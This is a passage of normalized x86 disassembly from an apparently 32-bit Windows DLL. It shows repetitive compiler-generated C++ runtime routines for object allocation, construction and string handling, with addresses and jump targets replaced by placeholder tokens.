mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_1003b9f8
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
sub_1003c64b
push 0x4c
mov eax sub_10047d34
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_10007ee2
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_10005af7
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x48 ]
push eax
call sub_1002f5a7
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
and [ ebp - 0x50 ] 0x0
push 0x1
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
dec edi
call sub_10007e4e
mov ecx eax
call sub_1003bc22
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
cmp edi esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push esi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
call sub_100023ce
mov eax edi
call sub_10023f1f
retn 0x20
add ebx 0xc
xor eax eax
jle r-xdata
push ebx
lea eax [ ebp - 0x50 ]
push eax
push edi
lea ecx [ ebp - 0x3c ]
call sub_10006a85
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1001b946
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push eax
lea ecx [ ebp - 0x3c ]
sub edi eax
call sub_1003b4af
push [ ebp - 0x44 ]
lea ecx [ ebp + 0xc ]
call sub_10005d76
cmp edi esi
ja r-xdata
cmp eax esi
jl r-xdata
jne r-xdata
cmp [ ebp - 0x44 ] si
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10006a85
push eax
call sub_100200e0
pop ecx
inc eax
jmp r-xdata
sub_1003c78c
push 0x4c
mov eax sub_10047d34
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_10007ee2
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_10005af7
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10007e4e
mov ecx eax
call sub_10006a85
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x48 ]
push eax
call sub_1002f5a7
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
and [ ebp - 0x50 ] 0x0
push 0x1
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
dec edi
call sub_10007e4e
mov ecx eax
call sub_1003bc22
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
cmp edi esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push esi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
call sub_100023ce
mov eax edi
call sub_10023f1f
retn 0x20
add ebx 0xc
xor eax eax
jle r-xdata
push ebx
lea eax [ ebp - 0x50 ]
push eax
push edi
lea ecx [ ebp - 0x3c ]
call sub_10006a85
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1001b946
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push eax
lea ecx [ ebp - 0x3c ]
sub edi eax
call sub_1003b4af
push [ ebp - 0x44 ]
lea ecx [ ebp + 0xc ]
call sub_1003b2bd
cmp edi esi
ja r-xdata
cmp eax esi
jl r-xdata
jne r-xdata
cmp [ ebp - 0x44 ] si
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10006a85
push eax
call sub_100200e0
pop ecx
inc eax
jmp r-xdata
sub_1003c8cd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003b86f
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1003c34a
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003c8f7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003b86f
push [ ebp + 0x8 ]
mov ecx esi
call sub_1003c3c0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c91e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003b86f
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1003c3e1
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003c948
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003b86f
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call sub_1003c2b5
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003c973
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003a619
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003ca14
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003a8d4
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003cab5
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003abc4
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003cb54
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ac28
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003cbee
push 0x24
mov eax sub_10047d72
call sub_10023e33
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x10 ] ecx
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_10001b23
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
sar eax 0x1
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1003c28d
mov eax esi
call sub_10023f0b
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1003c28d
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10007b6c
mov ecx eax
call sub_10006cbe
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10007b6c
mov ecx eax
call sub_10006cbe
push [ ebp - 0x10 ]
lea ecx [ ebx + edi * 2 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ecx
push eax
call sub_10046ebd
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_1003cc9c
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10020186
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003cd54
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ac6c
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003cdf3
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ac8f
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003ce92
push 0x94
mov eax sub_10047e00
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003beef
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003cf85
push 0x94
mov eax sub_10047e00
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003bf3b
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d024
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ace0
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d0c3
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003adc0
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d162
push 0x98
mov eax sub_1004836c
call sub_10023e33
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_10023f0b
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_10020186
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp - 0x14 ]
push ebx
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003bb17
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_100023ce
sub_1003d23d
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ae93
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d2d7
push 0x24
mov eax sub_10047da6
call sub_10023e33
mov [ ebp - 0x10 ] ecx
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_1003c01f
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
sar eax 0x1
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1003c4c2
mov eax esi
call sub_10023f0b
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1003c4c2
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_1003bbc2
mov ecx eax
call sub_1003aed5
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_1003bbc2
mov ecx eax
call sub_1003aed5
push [ ebp - 0x10 ]
lea ecx [ ebx + edi * 2 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ecx
push eax
call sub_1003afa6
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_1003d385
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10020186
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d43d
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003b023
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d4dc
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003b0b4
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d57b
push 0x94
mov eax sub_10047e00
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003bf87
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d636
push 0x94
mov eax sub_10047e00
call sub_10023e33
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
